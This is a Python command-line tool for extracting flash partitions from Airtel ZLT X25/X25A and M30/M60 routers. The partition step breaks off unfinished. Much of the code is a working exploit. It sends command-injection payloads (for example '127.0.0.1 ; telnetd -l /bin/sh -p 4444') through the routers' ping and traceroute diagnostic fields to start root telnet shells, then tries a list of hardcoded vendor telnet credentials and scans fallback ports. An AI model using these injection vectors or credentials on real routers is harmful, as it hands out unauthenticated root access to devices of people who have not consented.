#!/usr/bin/env python3
"""
ZLT X25 / X25A & M30 / M60  Firmware Partition Dumper  —  macOS Headless Edition

Dual firmware support: auto-detects goform (M30/M60) vs http.cgi (X25/X25A).
Full session logging: every HTTP request, every shell command, every result is
written to a timestamped .log file alongside the extracted .bin images so you
have a complete audit trail of exactly what happened.
"""

import hashlib
import json
import logging
import re
import socket
import ssl
import sys
import threading
import time
import traceback
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple

try:
    from rich import box
    from rich.align import Align
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import (
        BarColumn,
        DownloadColumn,
        Progress,
        SpinnerColumn,
        TextColumn,
        TimeRemainingColumn,
        TransferSpeedColumn,
    )
    from rich.prompt import Confirm, Prompt
    from rich.rule import Rule
    from rich.table import Table
except ImportError:
    print("\n[!] Missing required UI library 'rich'.")
    print("    Install it with: pip install rich\n")
    sys.exit(1)

console = Console()

# ==============================================================================
# SESSION-WIDE LOGGER
# ==============================================================================
# Configured in ZLTFirmwareDumperCLI.__init__ once the output dir is known.
# All other modules call:  logger.info(...)  logger.debug(...)  logger.error(...)

logger = logging.getLogger("zlt_dumper")

def _setup_logging(out_dir: Path) -> Path:
    """Wire the logger to a file in out_dir. Returns the log path."""
    log_path = out_dir / "session.log"
    fmt = logging.Formatter(
        "%(asctime)s  %(levelname)-8s  %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    fh = logging.FileHandler(log_path, encoding="utf-8")
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(fmt)
    logger.setLevel(logging.DEBUG)
    logger.addHandler(fh)
    return log_path


# ==============================================================================
# TELNET / RAW-SOCKET SHELL CLIENT
# ==============================================================================

class RouterShellClient:
    """Manages raw TCP/Telnet communication with BusyBox telnetd."""

    IAC  = 255
    DONT = 254
    DO   = 253
    WONT = 252
    WILL = 251
    SB   = 250
    SE   = 240

    def __init__(self, host: str, port: int, timeout: float = 8.0):
        self.host    = host
        self.port    = port
        self.timeout = timeout
        self.sock: Optional[socket.socket] = None
        self._lock   = threading.Lock()

    def connect(self, credentials: List[Tuple[str, str]]) -> bool:
        logger.debug("Telnet connect attempt → %s:%d", self.host, self.port)
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(self.timeout)
            self.sock.connect((self.host, self.port))
            logger.debug("TCP connected to %s:%d", self.host, self.port)

            time.sleep(0.4)
            banner = self._read_raw(timeout=2.0)
            logger.debug("Banner/prompt: %r", banner[:200])

            if any(k in banner.lower() for k in ["login:", "username:", "user:"]):
                logger.debug("Login prompt detected — trying credential list")
                for user, pwd in credentials:
                    logger.debug("Trying user=%r", user)
                    self._send_line(user)
                    time.sleep(0.4)
                    resp = self._read_raw(timeout=2.0)
                    if "password:" in resp.lower():
                        self._send_line(pwd)
                        time.sleep(0.6)
                        auth_check = self._read_raw(timeout=2.0)
                        logger.debug("Auth response: %r", auth_check[:120])
                        if any(p in auth_check for p in ["#", "$", "/"]):
                            logger.info("Authenticated via telnet as %r", user)
                            break
                    elif any(p in resp for p in ["#", "$", "/"]):
                        logger.info("Shell prompt without password prompt for %r", user)
                        break

            test_out = self.exec_cmd("echo ZLT_READY_CHECK", timeout=4.0)
            if "ZLT_READY_CHECK" in test_out:
                logger.info("Shell ready on %s:%d", self.host, self.port)
                return True
            logger.warning("Shell connected but echo test failed. Got: %r", test_out[:120])
            self.close()
            return False
        except Exception as exc:
            logger.debug("Telnet connect to %s:%d failed: %s", self.host, self.port, exc)
            self.close()
            return False

    def exec_cmd(self, cmd: str, timeout: float = 15.0) -> str:
        """Run a shell command synchronously using unique start/end echo markers."""
        with self._lock:
            if not self.sock:
                raise ConnectionError("Not connected to router shell.")

            self._read_raw(timeout=0.15)

            token    = f"__ZLT_{int(time.time() * 1000)}__"
            full_cmd = f"echo {token}_START; {cmd}; echo {token}_END:$?"
            logger.debug("SHELL CMD: %s", cmd)
            self._send_line(full_cmd)

            buf        = ""
            start_time = time.time()
            self.sock.settimeout(1.0)

            while time.time() - start_time < timeout:
                try:
                    raw = self.sock.recv(8192)
                    if not raw:
                        break
                    buf += self._strip_iac_and_reply(raw).decode("utf-8", errors="ignore")
                    if f"{token}_END:" in buf:
                        break
                except socket.timeout:
                    continue
                except Exception as exc:
                    raise ConnectionError(f"Socket read error: {exc}") from exc

            pattern = re.compile(
                rf"{token}_START\r?\n(.*?){token}_END:(\d+)", re.DOTALL
            )
            match = pattern.search(buf)
            if match:
                output = match.group(1)
                exit_code = match.group(2)
                clean = [
                    ln for ln in output.splitlines()
                    if token not in ln and full_cmd not in ln
                ]
                result = "\n".join(clean).strip()
                logger.debug("SHELL RESULT (exit=%s): %s", exit_code, result[:400])
                return result
            logger.debug("SHELL RAW (no markers): %r", buf[:400])
            return buf.strip()

    def close(self) -> None:
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None
            logger.debug("Telnet socket closed")

    # ── private helpers ────────────────────────────────────────────────────────

    def _strip_iac_and_reply(self, data: bytes) -> bytes:
        out     = bytearray()
        replies = bytearray()
        i = 0
        n = len(data)
        while i < n:
            b = data[i]
            if b == self.IAC:
                if i + 1 < n:
                    cmd = data[i + 1]
                    if cmd in (self.DO, self.DONT) and i + 2 < n:
                        replies.extend([self.IAC, self.WONT, data[i + 2]])
                        i += 3; continue
                    elif cmd in (self.WILL, self.WONT) and i + 2 < n:
                        replies.extend([self.IAC, self.DONT, data[i + 2]])
                        i += 3; continue
                    elif cmd == self.SB:
                        i += 2
                        while i < n and data[i] != self.SE:
                            i += 1
                        i += 1; continue
                    else:
                        i += 2; continue
                else:
                    i += 1
            else:
                out.append(b)
                i += 1
        if replies and self.sock:
            try:
                self.sock.sendall(bytes(replies))
            except Exception:
                pass
        return bytes(out)

    def _send_line(self, line: str) -> None:
        if not self.sock:
            raise ConnectionError("Router shell socket is not connected.")
        self.sock.sendall((line + "\n").encode("utf-8"))

    def _read_raw(self, timeout: float = 2.0) -> str:
        if not self.sock:
            return ""
        chunks = []
        start  = time.time()
        while time.time() - start < timeout:
            remaining = max(0.05, timeout - (time.time() - start))
            self.sock.settimeout(remaining)
            try:
                raw = self.sock.recv(4096)
                if not raw:
                    break
                chunks.append(self._strip_iac_and_reply(raw).decode("utf-8", errors="ignore"))
                if len(raw) < 4096:
                    time.sleep(0.08)
            except socket.timeout:
                break
            except Exception:
                break
        return "".join(chunks)


# ==============================================================================
# NETWORKING HELPERS
# ==============================================================================

def get_local_mac_ip(router_ip: str) -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((router_ip, 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def probe_router(router_ip: str, timeout: float = 4.0) -> Tuple[bool, str]:
    for proto in ("http", "https"):
        url = f"{proto}://{router_ip}/"
        try:
            ctx = ssl._create_unverified_context() if proto == "https" else None
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                logger.debug("probe_router %s → HTTP %d", url, resp.status)
                if resp.status in (200, 301, 302):
                    return True, proto
        except urllib.error.HTTPError as e:
            logger.debug("probe_router %s → HTTP %d (httpd alive)", url, e.code)
            return True, proto
        except Exception as exc:
            logger.debug("probe_router %s → %s", url, exc)
            continue
    return False, "http"


def web_login(
    proto: str,
    router_ip: str,
    username: str,
    password: str,
    timeout: float = 8.0,
) -> Tuple[bool, str, str, str]:
    """
    Authenticate to the router and return a session token.

    Returns: (success, session_id, endpoint_that_worked, error_message)

    session_id="" with success=True  →  IP-based auth (M30 Airtel build).
    Handles:
      1. goform LOGIN + sessionId cookie       (M30/M60 newer)
      2. goform LOGIN + IP-based auth          (M30 Airtel — no cookie)
      3. http.cgi JSON login                   (X25/X25A yocto_orca)
    """
    ctx = ssl._create_unverified_context() if proto == "https" else None

    base_headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Origin":           f"{proto}://{router_ip}",
        "Referer":          f"{proto}://{router_ip}/index.html",
        "User-Agent":       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    }

    def _extract_sid(headers, body: str) -> str:
        for hdr in ("Set-Cookie", "set-cookie"):
            val = headers.get(hdr, "")
            m = re.search(r"sessionId=([A-Za-z0-9_\-]{4,})", val)
            if m:
                logger.debug("sessionId from Set-Cookie: %r", m.group(1))
                return m.group(1)
        try:
            j = json.loads(body)
            for key in ("sessionId", "session_id", "sid", "token"):
                v = j.get(key)
                if isinstance(v, str) and len(v) >= 4:
                    logger.debug("sessionId from JSON[%r]: %r", key, v)
                    return v
        except (json.JSONDecodeError, AttributeError):
            pass
        for pat in (
            r'sessionId["\s:=]+([A-Za-z0-9_\-]{4,})',
            r'"sid"["\s:=]+([A-Za-z0-9_\-]{4,})',
            r'"token"["\s:=]+([A-Za-z0-9_\-]{4,})',
        ):
            m = re.search(pat, body, re.IGNORECASE)
            if m:
                logger.debug("sessionId from body pattern: %r", m.group(1))
                return m.group(1)
        return ""

    def _login_succeeded(body: str) -> bool:
        try:
            j = json.loads(body)
            r = str(j.get("result", ""))
            if r == "0":
                return True
            if r.isdigit():
                logger.debug("Login result code: %r (non-zero = failure)", r)
                return False
        except (json.JSONDecodeError, AttributeError):
            pass
        return True  # HTTP 200 with non-JSON body → assume success

    # ── Attempt 1: goform (M30 / M60 / MiFi) ─────────────────────────────────
    goform_url = f"{proto}://{router_ip}/goform/goform_set_cmd_process"
    for form_fields in [
        {"goformId": "LOGIN", "password": password, "username": username},
        {"goformId": "LOGIN", "password": password},
    ]:
        data = urllib.parse.urlencode(form_fields).encode("utf-8")
        hdrs = {**base_headers, "Content-Type": "application/x-www-form-urlencoded"}
        logger.info("LOGIN attempt → %s  fields=%s", goform_url,
                    list(form_fields.keys()))
        try:
            req = urllib.request.Request(goform_url, data=data, headers=hdrs, method="POST")
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read().decode("utf-8", errors="ignore")
                logger.debug("goform LOGIN response HTTP %d: %s", resp.status, body[:300])
                try:
                    j = json.loads(body)
                    if str(j.get("result", "0")) in ("3", "2", "1"):
                        logger.warning("goform LOGIN rejected: result=%r", j.get("result"))
                        return False, "", "", "Wrong username or password"
                except Exception:
                    pass
                sid = _extract_sid(resp.headers, body)
                if sid:
                    logger.info("goform LOGIN OK with sessionId")
                    return True, sid, goform_url, ""
                if _login_succeeded(body):
                    logger.info("goform LOGIN OK — IP-based auth (no sessionId cookie)")
                    return True, "", goform_url, ""
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="ignore")
            logger.debug("goform LOGIN HTTP %d: %s", e.code, body[:200])
            sid = _extract_sid(e.headers, body)
            if sid:
                return True, sid, goform_url, ""
            if any(k in body.lower() for k in ("invalid", "incorrect", "wrong", "denied")):
                return False, "", "", "Wrong username or password"
        except urllib.error.URLError as exc:
            logger.debug("goform endpoint not found: %s", exc)
            break
        except Exception as exc:
            logger.error("goform LOGIN exception: %s", exc)
            return False, "", "", str(exc)

    # ── Attempt 2: http.cgi JSON (X25 / X25A yocto_orca) ────────────────────
    cgi_url = f"{proto}://{router_ip}/cgi-bin/http.cgi"
    for payload in [
        {"cmd": 1,   "method": "POST", "subcmd": 1, "language": "EN",
         "username": username, "password": password},
        {"cmd": 100, "method": "POST", "subcmd": 0, "language": "EN",
         "user": username, "pass": password},
    ]:
        data = json.dumps(payload).encode("utf-8")
        hdrs = {**base_headers, "Content-Type": "application/json"}
        logger.info("LOGIN attempt → %s  cmd=%s", cgi_url, payload.get("cmd"))
        try:
            req = urllib.request.Request(cgi_url, data=data, headers=hdrs, method="POST")
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                body = resp.read().decode("utf-8", errors="ignore")
                logger.debug("http.cgi LOGIN response HTTP %d: %s", resp.status, body[:300])
                sid = _extract_sid(resp.headers, body)
                if sid:
                    logger.info("http.cgi LOGIN OK with sessionId")
                    return True, sid, cgi_url, ""
                if _login_succeeded(body):
                    logger.info("http.cgi LOGIN OK — no explicit sessionId")
                    return True, "", cgi_url, ""
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="ignore")
            logger.debug("http.cgi LOGIN HTTP %d: %s", e.code, body[:200])
            sid = _extract_sid(e.headers, body)
            if sid:
                return True, sid, cgi_url, ""
            if any(k in body.lower() for k in ("invalid", "incorrect", "wrong", "denied")):
                return False, "", "", "Wrong username or password"
        except urllib.error.URLError as exc:
            logger.debug("http.cgi endpoint not found: %s", exc)
            break
        except Exception as exc:
            logger.error("http.cgi LOGIN exception: %s", exc)
            return False, "", "", str(exc)

    return False, "", "", "No login endpoint on this router responded to any known format"


def send_cgi_payload(
    proto: str,
    router_ip: str,
    payload: dict,
    session_id: str,
    timeout: float = 6.0,
) -> Tuple[bool, str]:
    """
    Send an injection payload to the router.
    goformId present → form-encoded goform path (M30/M60).
    Otherwise        → JSON http.cgi path (X25/X25A).
    Cookie header is omitted when session_id is empty (IP-based auth).
    """
    ctx = ssl._create_unverified_context() if proto == "https" else None
    cookie_hdr = {"Cookie": f"sessionId={session_id}"} if session_id else {}

    if "goformId" in payload:
        url  = f"{proto}://{router_ip}/goform/goform_set_cmd_process"
        data = urllib.parse.urlencode(payload).encode("utf-8")
        hdrs = {
            "Content-Type":     "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "Origin":           f"{proto}://{router_ip}",
            "Referer":          f"{proto}://{router_ip}/index.html",
            "User-Agent":       "Mozilla/5.0",
            **cookie_hdr,
        }
    else:
        url  = f"{proto}://{router_ip}/cgi-bin/http.cgi"
        data = json.dumps(payload).encode("utf-8")
        hdrs = {
            "Content-Type":     "application/json",
            "X-Requested-With": "XMLHttpRequest",
            "Origin":           f"{proto}://{router_ip}",
            "Referer":          f"{proto}://{router_ip}/index.html",
            "User-Agent":       "Mozilla/5.0",
            **cookie_hdr,
        }

    logger.info("INJECTION POST → %s  payload=%s", url, json.dumps(payload)[:200])
    try:
        req = urllib.request.Request(url, data=data, headers=hdrs, method="POST")
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
            logger.debug("Injection response HTTP %d: %s", resp.status, body[:200])
            return True, body
    except Exception as exc:
        logger.warning("Injection POST failed: %s", exc)
        return False, str(exc)


def format_bytes(size: int) -> str:
    if size >= 1024 * 1024:
        return f"{size / (1024 * 1024):.2f} MB"
    elif size >= 1024:
        return f"{size / 1024:.1f} KB"
    return f"{size} B"


# ==============================================================================
# MAIN CLI
# ==============================================================================

class ZLTFirmwareDumperCLI:

    def __init__(self):
        self.router_ip      = "192.168.1.1"
        self.proto          = "http"
        self.mac_ip         = "127.0.0.1"
        self.web_username   = ""
        self.web_password   = ""
        self.session_id     = ""
        self.firmware_type  = "unknown"   # "goform" | "http.cgi" | "unknown"
        self.login_endpoint = ""
        self.shell: Optional[RouterShellClient] = None
        self.partitions: List[Dict]             = []
        self.http_port      = 8088
        self.httpd_active   = False
        self.out_dir: Optional[Path] = None   # set in step_5 before logging starts

        self.telnet_creds: List[Tuple[str, str]] = [
            ("root",         "admin"),
            ("admin",        "admin"),
            ("Gztz@83583#",  "83583000"),
            ("telecomadmin", "nE7jA%5m"),
        ]

    # --------------------------------------------------------------------------
    # BANNER
    # --------------------------------------------------------------------------

    def print_banner(self) -> None:
        console.clear()
        console.print(
            Panel(
                Align.center(
                    "[bold cyan]Airtel ZLT X25 / X25A  &  M30 / M60[/bold cyan]\n"
                    "[bold cyan]Firmware Partition Extractor[/bold cyan]\n"
                    "[dim]Dual firmware · Full session logging · macOS Headless Edition[/dim]"
                ),
                box=box.DOUBLE_EDGE,
                border_style="bright_blue",
                padding=(1, 2),
            )
        )

    # --------------------------------------------------------------------------
    # STEP 1 — NETWORK DISCOVERY
    # --------------------------------------------------------------------------

    def step_1_network_discovery(self) -> None:
        console.print(Rule("[bold bright_blue]Step 1 of 5  ·  Network & Router Discovery[/bold bright_blue]"))

        while True:
            self.router_ip = Prompt.ask(
                "\n[bold]Router IP address[/bold]", default=self.router_ip
            ).strip()
            logger.info("Probing router at %s", self.router_ip)

            with console.status(f"[cyan]Probing {self.router_ip}...[/cyan]", spinner="dots"):
                ok, proto = probe_router(self.router_ip)
                if not ok and self.router_ip == "192.168.1.1":
                    ok2, proto2 = probe_router("192.168.0.1")
                    if ok2:
                        self.router_ip, ok, proto = "192.168.0.1", True, proto2

            if ok:
                self.proto  = proto
                self.mac_ip = get_local_mac_ip(self.router_ip)
                logger.info("Router reachable at %s://%s  |  Mac LAN IP: %s",
                            proto, self.router_ip, self.mac_ip)
                console.print(f"  [green]✔[/green] Router → [bold]{proto}://{self.router_ip}[/bold]")
                console.print(f"  [green]✔[/green] Mac LAN IP → [bold]{self.mac_ip}[/bold]\n")
                return

            logger.warning("Cannot reach router at %s", self.router_ip)
            console.print(
                Panel(
                    f"[red]Cannot reach {self.router_ip}[/red]\n\n"
                    "• Make sure your Mac is on the router's Wi-Fi or LAN port.\n"
                    "• Disable any VPN or proxy.\n"
                    "• Check [bold]System Settings → Wi-Fi → Details → TCP/IP[/bold].",
                    title="[red]Connection Error[/red]", border_style="red",
                )
            )
            if not Confirm.ask("Retry?", default=True):
                sys.exit(1)

    # --------------------------------------------------------------------------
    # STEP 2 — WEB LOGIN  (headless, auto-detect firmware)
    # --------------------------------------------------------------------------

    def step_2_login_and_get_session(self) -> None:
        console.print(Rule("[bold bright_blue]Step 2 of 5  ·  Router Web Login (Headless)[/bold bright_blue]"))

        # Check if telnetd is already open from a previous run
        logger.info("Checking for existing open Telnet shell")
        with console.status("[cyan]Checking for existing root shell...[/cyan]"):
            for port in (4444, 4445, 23, 9876):
                client = RouterShellClient(self.router_ip, port, timeout=2.5)
                if client.connect(self.telnet_creds):
                    self.shell = client
                    logger.info("Existing root shell found on port %d — skipping login", port)
                    console.print(
                        f"  [green]✔[/green] Existing root shell on port [bold]{port}[/bold] — skipping login.\n"
                    )
                    return

        # Fingerprint firmware before showing the credential prompt
        self._fingerprint_firmware()

        console.print(
            Panel(
                f"Detected: [bold cyan]{self._firmware_label()}[/bold cyan]\n\n"
                "Enter the router admin credentials  (same as the browser login).\n\n"
                "Default if unchanged:  [bold]admin[/bold] / [bold]admin[/bold]\n"
                "[dim]Credentials are used only to get a session token. Never stored.[/dim]",
                title="[bold cyan]Router Credentials[/bold cyan]",
                border_style="cyan", padding=(1, 2),
            )
        )

        while True:
            username = Prompt.ask("[bold]Username[/bold]", default="admin")
            password = Prompt.ask("[bold]Password[/bold]", password=True)

            if not username or not password:
                console.print("[red]  ✘  Both fields are required.[/red]")
                continue

            self.web_username = username
            self.web_password = password
            logger.info("Attempting web login as %r", username)

            with console.status(f"[cyan]Authenticating as {username}...[/cyan]", spinner="dots"):
                ok, sid, endpoint, err = web_login(
                    self.proto, self.router_ip, username, password
                )

            if ok:
                self.session_id     = sid
                self.login_endpoint = endpoint
                self.firmware_type  = (
                    "goform"   if "goform"   in endpoint else
                    "http.cgi" if "http.cgi" in endpoint else
                    "other"
                )
                auth_mode = (
                    f"sessionId: [bold magenta]{sid[:16]}…[/bold magenta]"
                    if sid else
                    "[bold yellow]IP-based auth[/bold yellow] (router trusts your IP — no cookie)"
                )
                logger.info("Login OK  firmware=%s  endpoint=%s  sid=%r",
                            self.firmware_type, endpoint, sid[:16] if sid else "(none)")
                console.print(
                    f"  [green]✔[/green] Login OK — [bold cyan]{self._firmware_label()}[/bold cyan]\n"
                    f"  [green]✔[/green] Auth: {auth_mode}\n"
                )
                return

            if "Wrong username" in err or "password" in err.lower():
                logger.warning("Login rejected: %s", err)
                console.print(f"  [red]✘  {err}  — try again.[/red]")
                continue

            logger.error("Login failed: %s", err)
            console.print(
                Panel(
                    f"[yellow]Router responded but no session token was found.[/yellow]\n\n"
                    f"Detail: {err}\n\n"
                    "Options:\n"
                    "  1. Paste a sessionId from Chrome/Safari Dev Tools\n"
                    "  2. Press Enter to try fallback Telnet ports only",
                    title="[yellow]Session Warning[/yellow]", border_style="yellow",
                )
            )
            manual = Prompt.ask("[dim]Paste sessionId manually (or Enter to skip)[/dim]", default="").strip()
            if manual:
                m = re.search(r"sessionId=([A-Za-z0-9_\-]+)", manual)
                self.session_id = m.group(1) if m else manual
                logger.info("Manual sessionId supplied: %r", self.session_id[:16])
            return

    def _fingerprint_firmware(self) -> None:
        ctx = ssl._create_unverified_context() if self.proto == "https" else None
        logger.info("Fingerprinting firmware at %s://%s", self.proto, self.router_ip)

        goform_url = (f"{self.proto}://{self.router_ip}"
                      "/goform/goform_get_cmd_process?isTest=false&cmd=modem_main_state")
        try:
            req = urllib.request.Request(goform_url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=3.0, context=ctx) as resp:
                body = resp.read().decode("utf-8", errors="ignore")
                logger.debug("Fingerprint goform probe: HTTP %d  body=%r", resp.status, body[:100])
                if resp.status == 200 or "{" in body:
                    self.firmware_type = "goform"
                    logger.info("Firmware fingerprinted as: goform (M30/M60/MiFi)")
                    console.print("  [cyan]⊙[/cyan] Firmware: [bold]ZLT goform[/bold] (M30/M60/MiFi)\n")
                    return
        except Exception as exc:
            logger.debug("goform fingerprint probe failed: %s", exc)

        cgi_url = f"{self.proto}://{self.router_ip}/cgi-bin/http.cgi"
        try:
            data = json.dumps({"cmd": 0, "method": "GET", "language": "EN"}).encode()
            req  = urllib.request.Request(
                cgi_url, data=data,
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=3.0, context=ctx) as resp:
                logger.debug("Fingerprint http.cgi probe: HTTP %d", resp.status)
                if resp.status in (200, 400, 401):
                    self.firmware_type = "http.cgi"
                    logger.info("Firmware fingerprinted as: http.cgi (X25/X25A yocto_orca)")
                    console.print("  [cyan]⊙[/cyan] Firmware: [bold]ZLT http.cgi[/bold] (X25/X25A yocto_orca)\n")
                    return
        except Exception as exc:
            logger.debug("http.cgi fingerprint probe failed: %s", exc)

        logger.info("Firmware type unknown — will probe all methods")
        console.print("  [yellow]⊙[/yellow] Firmware unknown — probing all methods.\n")

    def _firmware_label(self) -> str:
        return {
            "goform":   "ZLT M30/M60 (goform CGI)",
            "http.cgi": "ZLT X25/X25A (yocto_orca http.cgi)",
            "other":    "Unknown ZLT variant",
            "unknown":  "Unknown (probing all methods)",
        }.get(self.firmware_type, "Unknown")

    # --------------------------------------------------------------------------
    # STEP 3 — SHELL INJECTION
    # --------------------------------------------------------------------------

    def step_3_activate_root_shell(self) -> None:
        if self.shell:
            return

        console.print(Rule("[bold bright_blue]Step 3 of 5  ·  Root Shell Activation[/bold bright_blue]"))

        while True:
            if self.session_id is not None:  # empty string is fine for IP-auth
                if self.firmware_type == "goform":
                    vectors = self._get_goform_injection_vectors()
                elif self.firmware_type == "http.cgi":
                    vectors = self._get_httpcgi_injection_vectors()
                else:
                    vectors = (self._get_httpcgi_injection_vectors()
                               + self._get_goform_injection_vectors())

                for desc, port, payload in vectors:
                    logger.info("Injection vector: %s → port %d", desc, port)
                    with console.status(f"[cyan]{desc}...[/cyan]", spinner="dots"):
                        ok, resp = send_cgi_payload(
                            self.proto, self.router_ip, payload, self.session_id
                        )
                        logger.debug("Injection %r → ok=%s resp=%r", desc, ok, resp[:100])
                        time.sleep(0.9)
                        client = RouterShellClient(self.router_ip, port, timeout=3.5)
                        if client.connect(self.telnet_creds):
                            self.shell = client
                            logger.info("Root shell opened via: %s on port %d", desc, port)
                            console.print(f"  [green]✔[/green] Root shell via [bold]{desc}[/bold]")
                            self._print_system_banner()
                            return

            # Fallback: probe stock ports + common alternates
            logger.info("Injection failed — probing Telnet ports (extended scan)")
            with console.status("[cyan]Probing common Telnet ports (21-24, 2323, 4444, 4445, 9876)...[/cyan]"):
                # X25 firmware sometimes has telnet on 21, 22, or 2323
                for port in (23, 9876, 4444, 4445, 21, 22, 24, 2323):
                    client = RouterShellClient(self.router_ip, port, timeout=3.0)
                    if client.connect(self.telnet_creds):
                        self.shell = client
                        logger.info("Shell found on fallback port %d", port)
                        console.print(f"  [green]✔[/green] Shell on port [bold]{port}[/bold]")
                        self._print_system_banner()
                        return

            logger.error("All injection vectors and fallback ports exhausted")
            console.print(
                Panel(
                    "[red]Could not open a root shell.[/red]\n\n"
                    "Likely causes:\n"
                    "  • Session expired (router kills idle sessions fast — retry immediately).\n"
                    "  • Firmware patched the diagnostic injection endpoint.\n"
                    "  • WAN/ping diagnostics disabled in the admin UI.",
                    title="[red]Shell Activation Failed[/red]", border_style="red",
                )
            )
            action = Prompt.ask(
                "[bold][R][/bold]etry  [bold][P][/bold]robe custom port  [bold][Q][/bold]uit",
                choices=["r", "p", "q"], default="r",
            )
            if action == "q":
                sys.exit(1)
            elif action == "p":
                port = int(Prompt.ask("Custom TCP port", default="23"))
                client = RouterShellClient(self.router_ip, port, timeout=4.0)
                if client.connect(self.telnet_creds):
                    self.shell = client
                    self._print_system_banner()
                    return
                logger.warning("Custom port %d — no shell", port)
                console.print(f"[red]  ✘  No shell on port {port}.[/red]")
            else:
                with console.status("[cyan]Re-authenticating...[/cyan]"):
                    ok, sid, endpoint, err = web_login(
                        self.proto, self.router_ip,
                        self.web_username, self.web_password,
                    )
                if ok:
                    self.session_id     = sid
                    self.login_endpoint = endpoint
                    logger.info("Re-auth OK, fresh session obtained")
                    console.print("  [green]✔[/green] Fresh session obtained.")
                else:
                    logger.error("Re-auth failed: %s", err)
                    console.print(f"  [red]✘  Re-auth failed: {err}[/red]")

    def _get_httpcgi_injection_vectors(self):
        """X25 / X25A  (yocto_orca)  —  JSON ping diagnostic injection.
        
        Multiple cmd numbers tried because different X25 firmware revisions
        use different diagnostic command IDs:
          cmd 172 subcmd 6 = WAN ping diagnostic (common)
          cmd 5   subcmd 1 = Network test (some builds)
          cmd 113          = System diagnostic (alternate)
        """
        vectors = []
        
        # Standard ping diagnostic (cmd 172 subcmd 6)
        for shell, port in [("/bin/sh", 4444), ("/bin/ash", 4445)]:
            vectors.append((
                f"http.cgi cmd:172 inject {shell} → :{port}", port, {
                    "enabled": "1",
                    "ip": f"127.0.0.1 ; telnetd -l {shell} -p {port}",
                    "cmd": 172,
                    "method": "POST",
                    "subcmd": 6,
                    "language": "EN",
                    "sessionId": self.session_id,
                }
            ))
        
        # Alternative: cmd 5 (network tools on some X25 builds)
        vectors.append((
            "http.cgi cmd:5 inject → :4444", 4444, {
                "cmd": 5,
                "method": "POST",
                "subcmd": 1,
                "language": "EN",
                "testType": "ping",
                "ipAddress": "127.0.0.1 ; telnetd -l /bin/sh -p 4444",
                "sessionId": self.session_id,
            }
        ))
        
        # Alternative: cmd 113 (system diagnostics)
        vectors.append((
            "http.cgi cmd:113 inject → :4445", 4445, {
                "cmd": 113,
                "method": "POST",
                "action": "ping",
                "target": "127.0.0.1 ; telnetd -l /bin/sh -p 4445",
                "language": "EN",
                "sessionId": self.session_id,
            }
        ))
        
        # Standard telnetd on :23
        vectors.append((
            "http.cgi cmd:172 telnetd → :23", 23, {
                "enabled": "1",
                "ip": f"{self.router_ip} ; telnetd -l /bin/sh",
                "cmd": 172,
                "method": "POST",
                "subcmd": 6,
                "language": "EN",
                "sessionId": self.session_id,
            }
        ))
        
        return vectors

    def _get_goform_injection_vectors(self):
        """M30 / M60 / MiFi  —  goform ping/traceroute diagnostic injection."""
        return [
            ("goform ping inject /bin/sh → :4444", 4444, {
                "goformId": "SET_WAN_DIAGNOSE", "Type": "ping",
                "pingIpAddr": "127.0.0.1 ; telnetd -l /bin/sh -p 4444",
            }),
            ("goform ping inject /bin/ash → :4445", 4445, {
                "goformId": "SET_WAN_DIAGNOSE", "Type": "ping",
                "pingIpAddr": "127.0.0.1 ; telnetd -l /bin/ash -p 4445",
            }),
            ("goform traceroute inject → :23", 23, {
                "goformId": "SET_WAN_DIAGNOSE", "Type": "traceroute",
                "traceRouteIpAddr": "127.0.0.1 ; telnetd -l /bin/sh",
            }),
        ]

    def _print_system_banner(self) -> None:
        if not self.shell:
            return
        uname  = self.shell.exec_cmd("uname -a")
        tmp_df = self.shell.exec_cmd("df -h /tmp | tail -n 1")
        logger.info("Router kernel: %s", uname)
        logger.info("Router /tmp:   %s", tmp_df)
        console.print(f"  [dim]Kernel:[/dim]   [italic]{uname}[/italic]")
        console.print(f"  [dim]/tmp RAM:[/dim] {tmp_df}\n")

    # --------------------------------------------------------------------------
    # STEP 4 — PARTITION DISCOVERY
    # --------------------------------------------------------------------------

    def step_4_discover_partitions(self) -> None:
        console.print(Rule("[bold bright_blue]Step 4 of 5  ·  Flash Partition & UBI Volume Map[/bold bright_blue]"))
        assert self.shell is not None

        logger.info("Reading partition map from router")
        with console.status("[cyan]Reading /proc/mtd and UBI volumes...[/cyan]"):
            mtd_raw     = self.shell.exec_cmd("cat /proc/mtd")
            ubi_raw     = self.shell.exec_cmd(
                'for d in /sys/class/ubi/ubi0_*; do '
                '[ -e "$d/name" ] && echo "$(basename $d)'
                '|$(cat $d/usable_eb_size 2>/dev/null || echo 0)'
                '|$(cat $d/data_bytes 2>/dev/null || echo 0)'
                '|$(cat $d/name)"; done'
            )
            tmp_free_kb = self._get_tmp_free_kb()

        logger.debug("/proc/mtd raw:\n%s", mtd_raw)
        logger.debug("UBI volumes raw:\n%s", ubi_raw)
        logger.info("Free /tmp RAM: %d KB", tmp_free_kb)

        self.partitions = []

        for m in re.finditer(
            r"^(mtd\d+):\s+([0-9a-fA-F]+)\s+([0-9a-fA-F]+)\s+\"([^\"]+)\"",
            mtd_raw, re.MULTILINE,
        ):
